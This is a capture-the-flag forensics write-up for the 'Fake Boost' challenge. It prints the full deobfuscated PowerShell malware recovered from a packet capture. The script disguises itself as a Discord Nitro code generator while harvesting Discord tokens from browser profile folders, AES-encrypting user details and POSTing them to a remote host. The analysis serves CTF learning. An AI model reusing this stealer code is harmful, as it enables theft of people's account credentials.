---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | Fake Boost Writeup
desc: Check out our writeup for Fake Boost for Cyber Apocalypse 2024 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: forensics
challenge: Fake Boost
tags: "forensics, starry, pcap, malware, powershell, dotnet, aes, encryption"
date: 2024-03-16T00:00:00+00:00
last_modified_at: 2024-03-16T00:00:00+00:00
---


> Solved by : Starry-lord

For this one again we get a pcap file, which contains HTTP objects we can look into:

![HTTP Objects](https://i.imgur.com/TKtBdJf.png)


Extracting freediscordnitro, we can see the content is obfuscated like we expect a malware would be.


![freediscordnitro](https://i.imgur.com/njhbGkU.png)


working on the content of the file, we can now reverse this long string above, and then decode it to read the first part of the flag

```
    $URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"
    
    function Steal {
        param (
            [string]$path
        )
    
        $tokens = @()
    
        try {
            Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
                
                try {
                    $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop
    
                    foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                        $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                            $_.Matches.Value
                        }
                    }
                } catch {}
            }
        } catch {}
    
        return $tokens
    }
    
    function GenerateDiscordNitroCodes {
        param (
            [int]$numberOfCodes = 10,
            [int]$codeLength = 16
        )
    
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        $codes = @()
    
        for ($i = 0; $i -lt $numberOfCodes; $i++) {
            $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
            $codes += $code
        }
    
        return $codes
    }
    
    function Get-DiscordUserInfo {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $true)]
            [string]$Token
        )
    
        process {
            try {
                $Headers = @{
                    "Authorization" = $Token
                    "Content-Type" = "application/json"
                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
                }
    
                $Uri = "https://discord.com/api/v9/users/@me"
    
                $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
                return $Response
            }
            catch {}
        }
    }
    
    function Create-AesManagedObject($key, $IV, $mode) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    
        if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
        elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
        elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
        elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
        elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}
    
    
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }
    
    function Encrypt-String($key, $plaintext) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
        $aesManaged = Create-AesManagedObject $key
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        [System.Convert]::ToBase64String($fullData)
    }
    
    Write-Host "
    ______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
    |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
    | |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
    |  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
    | | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
    \_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
                                                                                                             
                                                                                                             "
    Write-Host "Generating Discord nitro keys! Please be patient..."
    
    $local = $env:LOCALAPPDATA
    $roaming = $env:APPDATA
    $part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"
    
    $paths = @{
        'Google Chrome' = "$local\Google\Chrome\User Data\Default"
        'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
        'Opera' = "$roaming\Opera Software\Opera Stable"
        'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
    }
    
    $headers = @{
        'Content-Type' = 'application/json'
        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
    }
    
    $allTokens = @()
    foreach ($platform in $paths.Keys) {
        $currentPath = $paths[$platform]
    
        if (-not (Test-Path $currentPath -PathType Container)) {continue}
    
        $tokens = Steal -path $currentPath
        $allTokens += $tokens
    }
    
    $userInfos = @()
    foreach ($token in $allTokens) {
        $userInfo = Get-DiscordUserInfo -Token $token
        if ($userInfo) {
            $userDetails = [PSCustomObject]@{
                ID = $userInfo.id
                Email = $userInfo.email
                GlobalName = $userInfo.global_name
                Token = $token
            }
            $userInfos += $userDetails
        }
    }
    
    $AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
    $payload = $userInfos | ConvertTo-Json -Depth 10
    $encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload
    
    try {
        $headers = @{
            'Content-Type' = 'text/plain'
            'User-Agent' = 'Mozilla/5.0'
        }
        Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
    }
    catch {}
    
    Write-Host "Success! Discord Nitro Keys:"
    $keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
    $keys | ForEach-Object { Write-Output $_ }
```

We can see this is using AES encryption on the files while making the user think its generating free discord nitro keys, as well as a part1 of the flag.
It decrypted the content of the other file with using the same value for IV and for the AES key.


![b64 part 2 of flag](https://i.imgur.com/NynKykK.png)


```
HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

